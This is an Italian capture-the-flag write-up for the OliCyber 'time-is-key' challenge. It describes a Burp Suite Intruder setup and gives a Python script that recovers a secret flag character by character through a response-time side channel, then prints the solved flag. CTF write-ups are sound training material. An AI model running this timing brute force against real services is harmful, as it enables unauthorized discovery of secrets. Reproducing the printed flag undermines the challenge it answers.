@@ -1,0 +1,35 @@
+aprire Burp Suite, andare nella sezione "Target" e aprire il link della challenge (http://time-is-key.challs.olicyber.it/) nel browser. selezionare la root della pagina e fare "send to intruder". nella sezione "payload type" indicare "Brute forcer". 
+in "payload processing" selezionare la lunghezza indicata nel codice sorgente PHP della pagina. nella sezione della richiesta (sinistra) inserire una scritta "flag = §a§aaaaa", che sta ad indicare "flag = caratteri trovati§su chi ho il focus§cosa c'è dopo".
+da ogni carattere corretto scorre un secondo in più rispetto a quello prima. es: per trovare il primo carattere bisogna controllare il tempo trascorso dall'inserimento del carattere, che deve essere all'incirca 1 secondo.
+
+
+Script (per velocizzare il tutto):
+
+import requests #  da installare
+import time
+
+url = "http://time-is-key.challs.olicyber.it/"
+charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
+flag_length = 6
+known_flag = ""
+
+for position in range(flag_length):
+    for c in charset:
+        candidate = known_flag + c + "A" * (flag_length - len(known_flag) - 1)
+
+        data = {"flag": candidate}
+        start = time.time()
+        response = requests.post(url, data=data)
+        elapsed = time.time() - start
+
+        print(f"[{position+1}/{flag_length}] Trying: {candidate} | Time: {elapsed:.2f}s")
+
+        if elapsed > (position + 1):
+            known_flag += c
+            print(f"[+] Found character: {c} -> Partial flag: {known_flag}")
+            break
+
+print(f"\n[✅] Flag trovata: {known_flag}")
+
+
+Flag = flag{71m1n6}
